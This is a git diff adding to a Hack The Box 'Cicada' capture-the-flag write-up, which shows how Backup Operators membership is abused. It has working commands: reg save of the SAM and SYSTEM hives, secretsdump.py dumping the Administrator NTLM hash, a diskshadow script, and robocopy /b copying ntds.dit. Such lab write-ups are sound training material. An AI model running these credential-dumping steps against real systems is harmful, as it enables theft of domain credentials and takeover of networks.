@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: smb winrm defaultpassword missconfiguration crackmapexec 
+tags: smb winrm defaultpassword missconfiguration crackmapexec sam system ntds.dit robocopy regsave ntlm lm passthehash
 ---
 
 <br />
@@ -535,7 +535,7 @@ de493ce3050b87ade9fd7a6c82xxxxxx
 
 <br />
 
-While a time enumerating the system, we discover that `emily.oscars` is part of the `Backup Operators` group:
+While enumerating the system, we discover that `emily.oscars` is part of the `Backup Operators` group:
 
 <br />
 
@@ -571,7 +571,7 @@ The command completed successfully.
 
 <br />
 
-This missconfiguration is quite dangerous, as users in this group are allowed to `back up` and restore any file on the system.
+This misconfiguration is quite dangerous, as users in this group are allowed to `back up` and restore any file on the system.
 
 <br />
 
@@ -579,10 +579,174 @@ This missconfiguration is quite dangerous, as users in this group are allowed to
 
 <br />
 
-There are many techniques to exploit this group, we're going to see 2 different ways to do it.
+There are several techniques to exploit this group; here we'll look at two different methods.
 
 <br />
 
-## Reg save / SAM:
+## Reg Save: Dumping SAM & SYSTEM
 
 <br />
+
+The first technique is straightforward to exploit.
+
+We only need to make a copy of the `SAM` and `SYSTEM` files to run `secretsdump.py` and get the NTLM Administrator hash:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save HKLM\SAM SAM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save HKLM\SYSTEM SYSTEM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download SAM
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SAM to SAM
+                                           
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download SYSTEM
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SYSTEM to SYSTEM
+                                        
+Info: Download successful!
+```
+
+<br />
+
+Now we can run `secretsdump.py`:
+
+<br />
+
+```bash
+❯ secretsdump.py local -system SYSTEM -sam SAM
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up...
+```
+
+<br />
+
+## Reg save \ Diskshadow / Robocopy / NTDS.DIT:
+
+<br />
+
+The second method involves using Windows built-in utilities: `Diskshadow` and `Robocoppy`. 
+
+`Diskshadow` creates copies of a currently used drive, while `Robocopy` copies files and directories from one location to another.
+
+We cannot copy the system files directly using regular copy commands because they are always running and in use.
+
+To do this, first we will create a `diskshadow.txt` file with the folling content in our Linux system:
+
+<br />
+
+```bash
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+```
+
+<br />
+
+Then, we format the file with `unix2dos` and upload it:
+
+<br />
+
+```bash
+❯ unix2dos diskshadow.txt
+unix2dos: convirtiendo archivo diskshadow.txt a formato DOS...
+```
+
+<br />
+
+Once we've uploaded the file, we run the following `diskshadow` command:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> diskshadow /s diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  CICADA-DC,  5/31/2025 7:05:57 PM
+...[snip]...
+* Shadow copy ID = {d1fcf915-0eb5-4e77-aa41-7fedbed57510}		%cdrive%
+		- Shadow copy set: {19cee9ee-6f9b-4963-8bbb-3439f6143c0b}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
+		- Creation time: 5/31/2025 7:06:12 PM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: CICADA-DC.cicada.htb
+		- Service machine: CICADA-DC.cicada.htb
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent Differential
+
+Number of shadow copies listed: 1
+-> expose %cdrive% E:
+-> %cdrive% = {d1fcf915-0eb5-4e77-aa41-7fedbed57510}
+The shadow copy was successfully exposed as E:\.
+-> end backup
+->
+```
+
+<br />
+
+Finally, we use `Robocopy` to extract a copy of the `NTDS.DIT` file:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> robocopy /b E:\Windows\ntds . ntds.dit 
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+...[snip]...
+  0.0%
+  0.3%
+  0.7%
+  1.1%
+  1.5%
+  1.9%
+  2.3%
+  2.7%
+  3.1%
+  3.5%
+...[snip]...
+ 98.8%
+ 99.2%
+ 99.6%
+100%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           42,908,480 Bytes/sec.
+   Speed :            2,455.243 MegaBytes/min.
+   Ended : Saturday, May 31, 2025 7:08:15 PM
+
+```
+
+<br />
+
+
